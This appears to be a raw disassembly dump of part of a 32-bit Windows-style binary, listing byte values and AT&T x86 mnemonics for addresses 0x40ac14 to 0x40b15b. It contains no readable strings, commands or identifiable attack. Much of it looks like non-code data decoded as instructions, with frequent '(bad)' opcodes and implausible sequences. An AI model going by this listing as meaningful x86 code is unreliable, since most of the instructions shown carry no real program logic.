  40ac14:	fe 05 00 f5 02 00    	incb   0x2f500
  40ac1a:	00 00                	add    %al,(%eax)
  40ac1c:	6c                   	insb   (%dx),%es:(%edi)
  40ac1d:	18 ff                	sbb    %bh,%bh
  40ac1f:	52                   	push   %edx
  40ac20:	28 d8                	sub    %bl,%al
  40ac22:	fe 06                	incb   (%esi)
  40ac24:	00 f5                	add    %dh,%ch
  40ac26:	03 00                	add    (%eax),%eax
  40ac28:	00 00                	add    %al,(%eax)
  40ac2a:	6c                   	insb   (%dx),%es:(%edi)
  40ac2b:	18 ff                	sbb    %bh,%bh
  40ac2d:	52                   	push   %edx
  40ac2e:	28 c8                	sub    %cl,%al
  40ac30:	fe 00                	incb   (%eax)
  40ac32:	00 f5                	add    %dh,%ch
  40ac34:	04 00                	add    $0x0,%al
  40ac36:	00 00                	add    %al,(%eax)
  40ac38:	6c                   	insb   (%dx),%es:(%edi)
  40ac39:	18 ff                	sbb    %bh,%bh
  40ac3b:	52                   	push   %edx
  40ac3c:	28 b8 fe 00 00 f5    	sub    %bh,-0xaffff02(%eax)
  40ac42:	05 00 00 00 6c       	add    $0x6c000000,%eax
  40ac47:	18 ff                	sbb    %bh,%bh
  40ac49:	52                   	push   %edx
  40ac4a:	28 a8 fe 00 00 f5    	sub    %ch,-0xaffff02(%eax)
  40ac50:	06                   	push   %es
  40ac51:	00 00                	add    %al,(%eax)
  40ac53:	00 6c 18 ff          	add    %ch,-0x1(%eax,%ebx,1)
  40ac57:	52                   	push   %edx
  40ac58:	28 98 fe 00 00 f5    	sub    %bl,-0xaffff02(%eax)
  40ac5e:	07                   	pop    %es
  40ac5f:	00 00                	add    %al,(%eax)
  40ac61:	00 6c 18 ff          	add    %ch,-0x1(%eax,%ebx,1)
  40ac65:	52                   	push   %edx
  40ac66:	28 88 fe 00 00 f5    	sub    %cl,-0xaffff02(%eax)
  40ac6c:	08 00                	or     %al,(%eax)
  40ac6e:	00 00                	add    %al,(%eax)
  40ac70:	6c                   	insb   (%dx),%es:(%edi)
  40ac71:	18 ff                	sbb    %bh,%bh
  40ac73:	52                   	push   %edx
  40ac74:	28 78 fe             	sub    %bh,-0x2(%eax)
  40ac77:	00 00                	add    %al,(%eax)
  40ac79:	f5                   	cmc
  40ac7a:	09 00                	or     %eax,(%eax)
  40ac7c:	00 00                	add    %al,(%eax)
  40ac7e:	6c                   	insb   (%dx),%es:(%edi)
  40ac7f:	18 ff                	sbb    %bh,%bh
  40ac81:	52                   	push   %edx
  40ac82:	28 68 fe             	sub    %ch,-0x2(%eax)
  40ac85:	00 00                	add    %al,(%eax)
  40ac87:	f5                   	cmc
  40ac88:	0a 00                	or     (%eax),%al
  40ac8a:	00 00                	add    %al,(%eax)
  40ac8c:	6c                   	insb   (%dx),%es:(%edi)
  40ac8d:	18 ff                	sbb    %bh,%bh
  40ac8f:	52                   	push   %edx
  40ac90:	28 58 fe             	sub    %bl,-0x2(%eax)
  40ac93:	00 00                	add    %al,(%eax)
  40ac95:	f5                   	cmc
  40ac96:	0b 00                	or     (%eax),%eax
  40ac98:	00 00                	add    %al,(%eax)
  40ac9a:	6c                   	insb   (%dx),%es:(%edi)
  40ac9b:	18 ff                	sbb    %bh,%bh
  40ac9d:	52                   	push   %edx
  40ac9e:	28 48 fe             	sub    %cl,-0x2(%eax)
  40aca1:	00 00                	add    %al,(%eax)
  40aca3:	f5                   	cmc
  40aca4:	0c 00                	or     $0x0,%al
  40aca6:	00 00                	add    %al,(%eax)
  40aca8:	6c                   	insb   (%dx),%es:(%edi)
  40aca9:	18 ff                	sbb    %bh,%bh
  40acab:	52                   	push   %edx
  40acac:	28 38                	sub    %bh,(%eax)
  40acae:	fe 00                	incb   (%eax)
  40acb0:	00 f5                	add    %dh,%ch
  40acb2:	0d 00 00 00 6c       	or     $0x6c000000,%eax
  40acb7:	18 ff                	sbb    %bh,%bh
  40acb9:	52                   	push   %edx
  40acba:	28 28                	sub    %ch,(%eax)
  40acbc:	fe 00                	incb   (%eax)
  40acbe:	00 f5                	add    %dh,%ch
  40acc0:	0e                   	push   %cs
  40acc1:	00 00                	add    %al,(%eax)
  40acc3:	00 6c 18 ff          	add    %ch,-0x1(%eax,%ebx,1)
  40acc7:	52                   	push   %edx
  40acc8:	28 18                	sub    %bl,(%eax)
  40acca:	fe 00                	incb   (%eax)
  40accc:	00 f5                	add    %dh,%ch
  40acce:	0f 00 00             	sldt   (%eax)
  40acd1:	00 6c 18 ff          	add    %ch,-0x1(%eax,%ebx,1)
  40acd5:	52                   	push   %edx
  40acd6:	28 08                	sub    %cl,(%eax)
  40acd8:	fe 00                	incb   (%eax)
  40acda:	00 f5                	add    %dh,%ch
  40acdc:	10 00                	adc    %al,(%eax)
  40acde:	00 00                	add    %al,(%eax)
  40ace0:	6c                   	insb   (%dx),%es:(%edi)
  40ace1:	18 ff                	sbb    %bh,%bh
  40ace3:	52                   	push   %edx
  40ace4:	28 f8                	sub    %bh,%al
  40ace6:	fd                   	std
  40ace7:	00 00                	add    %al,(%eax)
  40ace9:	f5                   	cmc
  40acea:	11 00                	adc    %eax,(%eax)
  40acec:	00 00                	add    %al,(%eax)
  40acee:	6c                   	insb   (%dx),%es:(%edi)
  40acef:	18 ff                	sbb    %bh,%bh
  40acf1:	52                   	push   %edx
  40acf2:	28 e8                	sub    %ch,%al
  40acf4:	fd                   	std
  40acf5:	00 00                	add    %al,(%eax)
  40acf7:	f5                   	cmc
  40acf8:	12 00                	adc    (%eax),%al
  40acfa:	00 00                	add    %al,(%eax)
  40acfc:	6c                   	insb   (%dx),%es:(%edi)
  40acfd:	18 ff                	sbb    %bh,%bh
  40acff:	52                   	push   %edx
  40ad00:	28 d8                	sub    %bl,%al
  40ad02:	fd                   	std
  40ad03:	00 00                	add    %al,(%eax)
  40ad05:	f5                   	cmc
  40ad06:	13 00                	adc    (%eax),%eax
  40ad08:	00 00                	add    %al,(%eax)
  40ad0a:	6c                   	insb   (%dx),%es:(%edi)
  40ad0b:	18 ff                	sbb    %bh,%bh
  40ad0d:	52                   	push   %edx
  40ad0e:	28 c8                	sub    %cl,%al
  40ad10:	fd                   	std
  40ad11:	00 00                	add    %al,(%eax)
  40ad13:	f5                   	cmc
  40ad14:	14 00                	adc    $0x0,%al
  40ad16:	00 00                	add    %al,(%eax)
  40ad18:	6c                   	insb   (%dx),%es:(%edi)
  40ad19:	18 ff                	sbb    %bh,%bh
  40ad1b:	52                   	push   %edx
  40ad1c:	28 b8 fd 00 00 f5    	sub    %bh,-0xaffff03(%eax)
  40ad22:	15 00 00 00 6c       	adc    $0x6c000000,%eax
  40ad27:	18 ff                	sbb    %bh,%bh
  40ad29:	52                   	push   %edx
  40ad2a:	04 18                	add    $0x18,%al
  40ad2c:	ff 04 1c             	incl   (%esp,%ebx,1)
  40ad2f:	ff 0a                	decl   (%edx)
  40ad31:	02 00                	add    (%eax),%al
  40ad33:	08 00                	or     %al,(%eax)
  40ad35:	04 18                	add    $0x18,%al
  40ad37:	ff 5a 04             	lcall  *0x4(%edx)
  40ad3a:	1c ff                	sbb    $0xff,%al
  40ad3c:	fc                   	cld
  40ad3d:	f6 5c ff 00          	negb   0x0(%edi,%edi,8)
  40ad41:	1e                   	push   %ds
  40ad42:	28 e8                	sub    %ch,%al
  40ad44:	fe 00                	incb   (%eax)
  40ad46:	00 04 3c             	add    %al,(%esp,%edi,1)
  40ad49:	ff 04 5c             	incl   (%esp,%ebx,2)
  40ad4c:	ff                   	(bad)
  40ad4d:	fc                   	cld
  40ad4e:	35 49 f4 01 fc       	xor    $0xfc01f449,%eax
  40ad53:	cb                   	lret
  40ad54:	fd                   	std
  40ad55:	69 f8 fe fe 68 98    	imul   $0x9868fefe,%eax,%edi
  40ad5b:	fd                   	std
  40ad5c:	de 01                	fiadds (%ecx)
  40ad5e:	00 31                	add    %dh,(%ecx)
  40ad60:	04 4c                	add    $0x4c,%al
  40ad62:	ff 04 3c             	incl   (%esp,%edi,1)
  40ad65:	ff                   	(bad)
  40ad66:	fd                   	std
  40ad67:	93                   	xchg   %eax,%ebx
  40ad68:	0c 40                	or     $0x40,%al
  40ad6a:	04 5c                	add    $0x5c,%al
  40ad6c:	ff                   	(bad)
  40ad6d:	fe                   	(bad)
  40ad6e:	ae                   	scas   %es:(%edi),%al
  40ad6f:	1c ff                	sbb    $0xff,%al
  40ad71:	01 00                	add    %eax,(%eax)
  40ad73:	fc                   	cld
  40ad74:	22 04 88             	and    (%eax,%ecx,4),%al
  40ad77:	fd                   	std
  40ad78:	0a 03                	or     (%ebx),%al
  40ad7a:	00 08                	add    %cl,(%eax)
  40ad7c:	00 04 88             	add    %al,(%eax,%ecx,4)
  40ad7f:	fd                   	std
  40ad80:	fb                   	sti
  40ad81:	ef                   	out    %eax,(%dx)
  40ad82:	78 fd                	js     0x40ad81
  40ad84:	fc                   	cld
  40ad85:	f6 4c ff 36 04       	testb  $0x4,0x36(%edi,%edi,8)
  40ad8a:	00 1c ff             	add    %bl,(%edi,%edi,8)
  40ad8d:	88 fd                	mov    %bh,%ch
  40ad8f:	00 0b                	add    %cl,(%ebx)
  40ad91:	04 3c                	add    $0x3c,%al
  40ad93:	ff                   	(bad)
  40ad94:	fe                   	(bad)
  40ad95:	7e 98                	jle    0x40ad2f
  40ad97:	fd                   	std
  40ad98:	a2 01 00 1f fd       	mov    %al,0xfd1f0001
  40ad9d:	1d 0c 00 63 08       	sbb    $0x863000c,%eax
  40ada2:	ff 25 04 6c ff ff    	jmp    *0xffff6c04
  40ada8:	42                   	inc    %edx
  40ada9:	1c ff                	sbb    $0xff,%al
  40adab:	04 00                	add    $0x0,%al
  40adad:	02 00                	add    (%eax),%al
  40adaf:	fe                   	(bad)
  40adb0:	f7 68 fd             	imull  -0x3(%eax)
  40adb3:	04 68                	add    $0x68,%al
  40adb5:	fd                   	std
  40adb6:	71 64                	jno    0x40ae1c
  40adb8:	fd                   	std
  40adb9:	00 14 04             	add    %dl,(%esp,%eax,1)
  40adbc:	4c                   	dec    %esp
  40adbd:	ff                   	(bad)
  40adbe:	fd                   	std
  40adbf:	93                   	xchg   %eax,%ebx
  40adc0:	0c 40                	or     $0x40,%al
  40adc2:	6c                   	insb   (%dx),%es:(%edi)
  40adc3:	64 fd                	fs std
  40adc5:	fd                   	std
  40adc6:	9f                   	lahf
  40adc7:	fe                   	(bad)
  40adc8:	98                   	cwtl
  40adc9:	05 00 01 00 00       	add    $0x100,%eax
  40adce:	0d 6c 64 fd fd       	or     $0xfdfd646c,%eax
  40add3:	9f                   	lahf
  40add4:	fe                   	(bad)
  40add5:	98                   	cwtl
  40add6:	06                   	push   %es
  40add7:	00 00                	add    %al,(%eax)
  40add9:	00 00                	add    %al,(%eax)
  40addb:	0a f5                	or     %ch,%dh
  40addd:	00 00                	add    %al,(%eax)
  40addf:	00 00                	add    %al,(%eax)
  40ade1:	71 64                	jno    0x40ae47
  40ade3:	fd                   	std
  40ade4:	00 00                	add    %al,(%eax)
  40ade6:	14 00                	adc    $0x0,%al
  40ade8:	30 6e 40             	xor    %ch,0x40(%esi)
  40adeb:	00 08                	add    %cl,(%eax)
  40aded:	00 18                	add    %bl,(%eax)
  40adef:	02 2c 02             	add    (%edx,%eax,1),%ch
  40adf2:	44                   	inc    %esp
  40adf3:	00 00                	add    %al,(%eax)
  40adf5:	00 00                	add    %al,(%eax)
  40adf7:	00 66 00             	add    %ah,0x0(%esi)
  40adfa:	13 00                	adc    (%eax),%eax
  40adfc:	00 00                	add    %al,(%eax)
  40adfe:	00 00                	add    %al,(%eax)
  40ae00:	2c 00                	sub    $0x0,%al
  40ae02:	00 00                	add    %al,(%eax)
  40ae04:	00 00                	add    %al,(%eax)
  40ae06:	08 00                	or     %al,(%eax)
  40ae08:	00 00                	add    %al,(%eax)
  40ae0a:	00 00                	add    %al,(%eax)
  40ae0c:	a8 fd                	test   $0xfd,%al
  40ae0e:	02 00                	add    (%eax),%al
  40ae10:	98                   	cwtl
  40ae11:	fd                   	std
  40ae12:	02 00                	add    (%eax),%al
  40ae14:	68 fd 02 00 3c       	push   $0x3c0002fd
  40ae19:	ff 02                	incl   (%edx)
  40ae1b:	00 4c ff 02          	add    %cl,0x2(%edi,%edi,8)
  40ae1f:	00 6c ff 02          	add    %ch,0x2(%edi,%edi,8)
  40ae23:	00 5c ff 02          	add    %bl,0x2(%edi,%edi,8)
  40ae27:	00 2c ff             	add    %ch,(%edi,%edi,8)
  40ae2a:	02 00                	add    (%eax),%al
  40ae2c:	22 00                	and    (%eax),%al
  40ae2e:	00 00                	add    %al,(%eax)
  40ae30:	00 00                	add    %al,(%eax)
  40ae32:	04 00                	add    $0x0,%al
  40ae34:	00 00                	add    %al,(%eax)
  40ae36:	00 00                	add    %al,(%eax)
  40ae38:	1c ff                	sbb    $0xff,%al
  40ae3a:	02 00                	add    (%eax),%al
  40ae3c:	88 fd                	mov    %bh,%ch
  40ae3e:	02 00                	add    (%eax),%al
  40ae40:	78 fd                	js     0x40ae3f
  40ae42:	02 00                	add    (%eax),%al
  40ae44:	18 ff                	sbb    %bh,%bh
  40ae46:	05 01 ff ff ff       	add    $0xffffff01,%eax
  40ae4b:	ff 02                	incl   (%edx)
  40ae4d:	00 01                	add    %al,(%ecx)
  40ae4f:	00 63 01             	add    %ah,0x1(%ebx)
  40ae52:	00 00                	add    %al,(%eax)
  40ae54:	f4                   	hlt
  40ae55:	00 04 74             	add    %al,(%esp,%esi,2)
  40ae58:	ff 05 00 00 24 01    	incl   0x1240000
  40ae5e:	00 0d 14 00 02 00    	add    %cl,0x20014
  40ae64:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  40ae68:	7c 00                	jl     0x40ae6a
  40ae6a:	03 00                	add    (%eax),%eax
  40ae6c:	1a 74 ff 04          	sbb    0x4(%edi,%edi,8),%dh
  40ae70:	64 ff 0a             	decl   %fs:(%edx)
  40ae73:	04 00                	add    $0x0,%al
  40ae75:	04 00                	add    $0x0,%al
  40ae77:	35 64 ff 04 64       	xor    $0x6404ff64,%eax
  40ae7c:	ff 0a                	decl   (%edx)
  40ae7e:	05 00 04 00 35       	add    $0x35000400,%eax
  40ae83:	64 ff 04 64          	incl   %fs:(%esp,%eiz,2)
  40ae87:	ff 0a                	decl   (%edx)
  40ae89:	06                   	push   %es
  40ae8a:	00 04 00             	add    %al,(%eax,%eax,1)
  40ae8d:	04 64                	add    $0x64,%al
  40ae8f:	ff                   	(bad)
  40ae90:	3a 54 ff 07          	cmp    0x7(%edi,%edi,8),%dl
  40ae94:	00 5d fb             	add    %bl,-0x5(%ebp)
  40ae97:	40                   	inc    %eax
  40ae98:	35 64 ff 1c 64       	xor    $0x641cff64,%eax
  40ae9d:	00 04 64             	add    %al,(%esp,%eiz,2)
  40aea0:	ff 0a                	decl   (%edx)
  40aea2:	06                   	push   %es
  40aea3:	00 04 00             	add    %al,(%eax,%eax,1)
  40aea6:	04 64                	add    $0x64,%al
  40aea8:	ff                   	(bad)
  40aea9:	fd                   	std
  40aeaa:	fe 40 ff             	incb   -0x1(%eax)
  40aead:	0a 08                	or     (%eax),%cl
  40aeaf:	00 04 00             	add    %al,(%eax,%eax,1)
  40aeb2:	2f                   	das
  40aeb3:	40                   	inc    %eax
  40aeb4:	ff 35 64 ff 0b 09    	push   0x90bff64
  40aeba:	00 00                	add    %al,(%eax)
  40aebc:	00 31                	add    %dh,(%ecx)
  40aebe:	2c ff                	sub    $0xff,%al
  40aec0:	04 40                	add    $0x40,%al
  40aec2:	ff 04 74             	incl   (%esp,%esi,2)
  40aec5:	ff 05 00 00 24 01    	incl   0x1240000
  40aecb:	00 0d 14 00 02 00    	add    %cl,0x20014
  40aed1:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  40aed5:	58                   	pop    %eax
  40aed6:	00 03                	add    %al,(%ebx)
  40aed8:	00 0b                	add    %cl,(%ebx)
  40aeda:	09 00                	or     %eax,(%eax)
  40aedc:	00 00                	add    %al,(%eax)
  40aede:	fd                   	std
  40aedf:	c7                   	(bad)
  40aee0:	30 ff                	xor    %bh,%bh
  40aee2:	3e 2c ff             	ds sub $0xff,%al
  40aee5:	23 3c ff             	and    (%edi,%edi,8),%edi
  40aee8:	6c                   	insb   (%dx),%es:(%edi)
  40aee9:	40                   	inc    %eax
  40aeea:	ff 2a                	ljmp   *(%edx)
  40aeec:	23 38                	and    (%eax),%edi
  40aeee:	ff 1b                	lcall  *(%ebx)
  40aef0:	0a 00                	or     (%eax),%al
  40aef2:	2a fd                	sub    %ch,%bh
  40aef4:	c7                   	(bad)
  40aef5:	34 ff                	xor    $0xff,%al
  40aef7:	04 64                	add    $0x64,%al
  40aef9:	ff 0a                	decl   (%edx)
  40aefb:	0b 00                	or     (%eax),%eax
  40aefd:	0c 00                	or     $0x0,%al
  40aeff:	32 0c 00             	xor    (%eax,%eax,1),%cl
  40af02:	3c ff                	cmp    $0xff,%al
  40af04:	40                   	inc    %eax
  40af05:	ff                   	(bad)
  40af06:	38 ff                	cmp    %bh,%bh
  40af08:	34 ff                	xor    $0xff,%al
  40af0a:	30 ff                	xor    %bh,%bh
  40af0c:	2c ff                	sub    $0xff,%al
  40af0e:	1a 74 ff 35          	sbb    0x35(%edi,%edi,8),%dh
  40af12:	64 ff 0b             	decl   %fs:(%ebx)
  40af15:	09 00                	or     %eax,(%eax)
  40af17:	00 00                	add    %al,(%eax)
  40af19:	23 40 ff             	and    -0x1(%eax),%eax
  40af1c:	21 0f                	and    %ecx,(%edi)
  40af1e:	fc                   	cld
  40af1f:	02 19                	add    (%ecx),%bl
  40af21:	74 ff                	je     0x40af22
  40af23:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  40af27:	ac                   	lods   %ds:(%esi),%al
  40af28:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40af2b:	2f                   	das
  40af2c:	40                   	inc    %eax
  40af2d:	ff 1a                	lcall  *(%edx)
  40af2f:	74 ff                	je     0x40af30
  40af31:	28 f8                	sub    %bh,%al
  40af33:	fe 00                	incb   (%eax)
  40af35:	00 04 1c             	add    %al,(%esp,%ebx,1)
  40af38:	ff 04 1a             	incl   (%edx,%ebx,1)
  40af3b:	ff 21                	jmp    *(%ecx)
  40af3d:	0f fc 02             	paddb  (%edx),%mm0
  40af40:	19 74 ff 08          	sbb    %esi,0x8(%edi,%edi,8)
  40af44:	74 ff                	je     0x40af45
  40af46:	0d b0 00 0c 00       	or     $0xc00b0,%eax
  40af4b:	6b 1a ff             	imul   $0xffffffff,(%edx),%ebx
  40af4e:	f4                   	hlt
  40af4f:	01 ad 44 08 ff 1a    	add    %ebp,0x1aff0844(%ebp)
  40af55:	74 ff                	je     0x40af56
  40af57:	fe                   	(bad)
  40af58:	68 d8 fe d4 01       	push   $0x1d4fed8
  40af5d:	04 40                	add    $0x40,%al
  40af5f:	ff 04 1c             	incl   (%esp,%ebx,1)
  40af62:	ff 55 21             	call   *0x21(%ebp)
  40af65:	0f fc 02             	paddb  (%edx),%mm0
  40af68:	19 74 ff 08          	sbb    %esi,0x8(%edi,%edi,8)
  40af6c:	74 ff                	je     0x40af6d
  40af6e:	0d c0 00 0c 00       	or     $0xc00c0,%eax
  40af73:	6c                   	insb   (%dx),%es:(%edi)
  40af74:	40                   	inc    %eax
  40af75:	ff 1b                	lcall  *(%ebx)
  40af77:	0d 00 2a 31 78       	or     $0x78312a00,%eax
  40af7c:	ff 2f                	ljmp   *(%edi)
  40af7e:	40                   	inc    %eax
  40af7f:	ff 1a                	lcall  *(%edx)
  40af81:	74 ff                	je     0x40af82
  40af83:	04 40                	add    $0x40,%al
  40af85:	ff 04 1c             	incl   (%esp,%ebx,1)
  40af88:	ff 55 21             	call   *0x21(%ebp)
  40af8b:	0f fc 02             	paddb  (%edx),%mm0
  40af8e:	19 74 ff 08          	sbb    %esi,0x8(%edi,%edi,8)
  40af92:	74 ff                	je     0x40af93
  40af94:	0d c0 00 0c 00       	or     $0xc00c0,%eax
  40af99:	6c                   	insb   (%dx),%es:(%edi)
  40af9a:	40                   	inc    %eax
  40af9b:	ff 4a f5             	decl   -0xb(%edx)
  40af9e:	03 00                	add    (%eax),%eax
  40afa0:	00 00                	add    %al,(%eax)
  40afa2:	c7                   	(bad)
  40afa3:	2f                   	das
  40afa4:	40                   	inc    %eax
  40afa5:	ff 1a                	lcall  *(%edx)
  40afa7:	74 ff                	je     0x40afa8
  40afa9:	1c 77                	sbb    $0x77,%al
  40afab:	01 04 40             	add    %eax,(%eax,%eax,2)
  40afae:	ff 04 1c             	incl   (%esp,%ebx,1)
  40afb1:	ff 55 21             	call   *0x21(%ebp)
  40afb4:	0f fc 02             	paddb  (%edx),%mm0
  40afb7:	19 74 ff 08          	sbb    %esi,0x8(%edi,%edi,8)
  40afbb:	74 ff                	je     0x40afbc
  40afbd:	0d c0 00 0c 00       	or     $0xc00c0,%eax
  40afc2:	3e 40                	ds inc %eax
  40afc4:	ff 31                	push   (%ecx)
  40afc6:	78 ff                	js     0x40afc7
  40afc8:	1a 74 ff 0b          	sbb    0xb(%edi,%edi,8),%dh
  40afcc:	09 00                	or     %eax,(%eax)
  40afce:	00 00                	add    %al,(%eax)
  40afd0:	31 30                	xor    %esi,(%eax)
  40afd2:	ff 04 40             	incl   (%eax,%eax,2)
  40afd5:	ff 04 74             	incl   (%esp,%esi,2)
  40afd8:	ff 05 00 00 24 01    	incl   0x1240000
  40afde:	00 0d 14 00 02 00    	add    %cl,0x20014
  40afe4:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  40afe8:	58                   	pop    %eax
  40afe9:	00 03                	add    %al,(%ebx)
  40afeb:	00 04 78             	add    %al,(%eax,%edi,2)
  40afee:	ff                   	(bad)
  40afef:	3e 30 ff             	ds xor %bh,%bh
  40aff2:	23 3c ff             	and    (%edi,%edi,8),%edi
  40aff5:	6c                   	insb   (%dx),%es:(%edi)
  40aff6:	40                   	inc    %eax
  40aff7:	ff 2a                	ljmp   *(%edx)
  40aff9:	23 38                	and    (%eax),%edi
  40affb:	ff 1b                	lcall  *(%ebx)
  40affd:	0a 00                	or     (%eax),%al
  40afff:	2a fd                	sub    %ch,%bh
  40b001:	c7                   	(bad)
  40b002:	34 ff                	xor    $0xff,%al
  40b004:	04 64                	add    $0x64,%al
  40b006:	ff 0a                	decl   (%edx)
  40b008:	0b 00                	or     (%eax),%eax
  40b00a:	0c 00                	or     $0x0,%al
  40b00c:	32 0a                	xor    (%edx),%cl
  40b00e:	00 3c ff             	add    %bh,(%edi,%edi,8)
  40b011:	40                   	inc    %eax
  40b012:	ff                   	(bad)
  40b013:	38 ff                	cmp    %bh,%bh
  40b015:	34 ff                	xor    $0xff,%al
  40b017:	30 ff                	xor    %bh,%bh
  40b019:	1a 74 ff 35          	sbb    0x35(%edi,%edi,8),%dh
  40b01d:	64 ff 04 1c          	incl   %fs:(%esp,%ebx,1)
  40b021:	ff                   	(bad)
  40b022:	fe                   	(bad)
  40b023:	7e d8                	jle    0x40affd
  40b025:	fe 09                	decb   (%ecx)
  40b027:	01 04 64             	add    %eax,(%esp,%eiz,2)
  40b02a:	ff 0a                	decl   (%edx)
  40b02c:	06                   	push   %es
  40b02d:	00 04 00             	add    %al,(%eax,%eax,1)
  40b030:	04 64                	add    $0x64,%al
  40b032:	ff                   	(bad)
  40b033:	3a 54 ff 07          	cmp    0x7(%edi,%edi,8),%dl
  40b037:	00 5d fb             	add    %bl,-0x5(%ebp)
  40b03a:	33 35 64 ff 1c 34    	xor    0x341cff64,%esi
  40b040:	02 04 64             	add    (%esp,%eiz,2),%al
  40b043:	ff 0a                	decl   (%edx)
  40b045:	0e                   	push   %cs
  40b046:	00 04 00             	add    %al,(%eax,%eax,1)
  40b049:	35 64 ff 04 64       	xor    $0x6404ff64,%eax
  40b04e:	ff 0a                	decl   (%edx)
  40b050:	0f 00 04 00          	sldt   (%eax,%eax,1)
  40b054:	35 64 ff 27 a8       	xor    $0xa827ff64,%eax
  40b059:	fe                   	(bad)
  40b05a:	27                   	daa
  40b05b:	c8 fe 3a 08          	enter  $0x3afe,$0x8
  40b05f:	ff 10                	call   *(%eax)
  40b061:	00 4e 44             	add    %cl,0x44(%esi)
  40b064:	ff 04 44             	incl   (%esp,%eax,2)
  40b067:	ff f5                	push   %ebp
  40b069:	10 00                	adc    %al,(%eax)
  40b06b:	00 00                	add    %al,(%eax)
  40b06d:	3a 54 ff 11          	cmp    0x11(%edi,%edi,8),%dl
  40b071:	00 4e 64             	add    %cl,0x64(%esi)
  40b074:	ff 04 64             	incl   (%esp,%eiz,2)
  40b077:	ff 0a                	decl   (%edx)
  40b079:	12 00                	adc    (%eax),%al
  40b07b:	14 00                	adc    $0x0,%al
  40b07d:	36 08 00             	or     %al,%ss:(%eax)
  40b080:	64 ff 44 ff c8       	incl   %fs:-0x38(%edi,%edi,8)
  40b085:	fe                   	(bad)
  40b086:	a8 fe                	test   $0xfe,%al
  40b088:	1b 13                	sbb    (%ebx),%edx
  40b08a:	00 04 40             	add    %al,(%eax,%eax,2)
  40b08d:	ff 34 6c             	push   (%esp,%ebp,2)
  40b090:	40                   	inc    %eax
  40b091:	ff f5                	push   %ebp
  40b093:	01 00                	add    %eax,(%eax)
  40b095:	00 00                	add    %al,(%eax)
  40b097:	f5                   	cmc
  40b098:	00 00                	add    %al,(%eax)
  40b09a:	00 00                	add    %al,(%eax)
  40b09c:	5e                   	pop    %esi
  40b09d:	14 00                	adc    $0x0,%al
  40b09f:	0c 00                	or     $0x0,%al
  40b0a1:	71 a0                	jno    0x40b043
  40b0a3:	fe                   	(bad)
  40b0a4:	3c 6c                	cmp    $0x6c,%al
  40b0a6:	a0 fe 71 a4 fe       	mov    0xfea471fe,%al
  40b0ab:	2f                   	das
  40b0ac:	40                   	inc    %eax
  40b0ad:	ff 04 a0             	incl   (%eax,%eiz,4)
  40b0b0:	fe 0b                	decb   (%ebx)
  40b0b2:	15 00 00 00 19       	adc    $0x19000000,%eax
  40b0b7:	74 ff                	je     0x40b0b8
  40b0b9:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  40b0bd:	4c                   	dec    %esp
  40b0be:	00 16                	add    %dl,(%esi)
  40b0c0:	00 6c a0 fe          	add    %ch,-0x2(%eax,%eiz,4)
  40b0c4:	f5                   	cmc
  40b0c5:	b7 00                	mov    $0x0,%bh
  40b0c7:	00 00                	add    %al,(%eax)
  40b0c9:	c7                   	(bad)
  40b0ca:	1a 74 ff 1c          	sbb    0x1c(%edi,%edi,8),%dh
  40b0ce:	90                   	nop
  40b0cf:	02 6c a4 fe          	add    -0x2(%esp,%eiz,4),%ch
  40b0d3:	0a 17                	or     (%edi),%dl
  40b0d5:	00 04 00             	add    %al,(%eax,%eax,1)
  40b0d8:	3c 6c                	cmp    $0x6c,%al
  40b0da:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b0db:	fe 0a                	decb   (%edx)
  40b0dd:	18 00                	sbb    %al,(%eax)
  40b0df:	04 00                	add    $0x0,%al
  40b0e1:	3c fc                	cmp    $0xfc,%al
  40b0e3:	c8 13 00 00          	enter  $0x13,$0x0
  40b0e7:	00 70 75             	add    %dh,0x75(%eax)
  40b0ea:	40                   	inc    %eax
  40b0eb:	00 04 00             	add    %al,(%eax,%eax,1)
  40b0ee:	dc 00                	faddl  (%eax)
  40b0f0:	94                   	xchg   %eax,%esp
  40b0f1:	02 34 00             	add    (%eax,%eax,1),%dh
  40b0f4:	00 00                	add    %al,(%eax)
  40b0f6:	00 00                	add    %al,(%eax)
  40b0f8:	00 00                	add    %al,(%eax)
  40b0fa:	13 00                	adc    (%eax),%eax
  40b0fc:	00 00                	add    %al,(%eax)
  40b0fe:	00 00                	add    %al,(%eax)
  40b100:	1c 00                	sbb    $0x0,%al
  40b102:	00 00                	add    %al,(%eax)
  40b104:	00 00                	add    %al,(%eax)
  40b106:	04 00                	add    $0x0,%al
  40b108:	00 00                	add    %al,(%eax)
  40b10a:	00 00                	add    %al,(%eax)
  40b10c:	e8 fe 02 00 d8       	call   0xd840b40f
  40b111:	fe 02                	incb   (%edx)
  40b113:	00 1c ff             	add    %bl,(%edi,%edi,8)
  40b116:	02 00                	add    (%eax),%al
  40b118:	78 ff                	js     0x40b119
  40b11a:	01 00                	add    %eax,(%eax)
  40b11c:	38 00                	cmp    %al,(%eax)
  40b11e:	00 00                	add    %al,(%eax)
  40b120:	00 00                	add    %al,(%eax)
  40b122:	0b 00                	or     (%eax),%eax
  40b124:	00 00                	add    %al,(%eax)
  40b126:	00 00                	add    %al,(%eax)
  40b128:	40                   	inc    %eax
  40b129:	ff 01                	incl   (%ecx)
  40b12b:	00 3c ff             	add    %bh,(%edi,%edi,8)
  40b12e:	01 00                	add    %eax,(%eax)
  40b130:	38 ff                	cmp    %bh,%bh
  40b132:	01 00                	add    %eax,(%eax)
  40b134:	34 ff                	xor    $0xff,%al
  40b136:	01 00                	add    %eax,(%eax)
  40b138:	30 ff                	xor    %bh,%bh
  40b13a:	01 00                	add    %eax,(%eax)
  40b13c:	2c ff                	sub    $0xff,%al
  40b13e:	01 00                	add    %eax,(%eax)
  40b140:	74 ff                	je     0x40b141
  40b142:	03 00                	add    (%eax),%eax
  40b144:	64 ff 02             	incl   %fs:(%edx)
  40b147:	00 44 ff 02          	add    %al,0x2(%edi,%edi,8)
  40b14b:	00 c8                	add    %cl,%al
  40b14d:	fe 02                	incb   (%edx)
  40b14f:	00 a8 fe 02 00 cc    	add    %ch,-0x33fffd02(%eax)
  40b155:	cc                   	int3
  40b156:	cc                   	int3
  40b157:	cc                   	int3
  40b158:	cc                   	int3
  40b159:	cc                   	int3
  40b15a:	cc                   	int3
  40b15b:	cc                   	int3
